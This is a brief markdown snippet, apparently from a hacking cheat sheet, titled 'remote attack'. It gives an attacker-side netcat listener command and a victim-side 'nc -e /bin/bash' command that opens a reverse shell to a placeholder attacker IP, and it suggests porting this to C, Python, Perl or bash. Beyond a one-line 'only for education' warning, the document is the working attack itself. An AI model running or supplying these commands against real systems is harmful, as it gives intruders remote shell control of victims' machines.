## remote attack

- Attacker
```bash
nc -lnvp 77 -s 192.168.x.x
```
- Victim
```bash
nc -e /bin/bash 192.168.x.x 77
```
## Description:
192.168.x.x = attacker IP.
You can customize this in C, Python, Perl, or bash programs. =)

## WARNING:
Only for education!!!
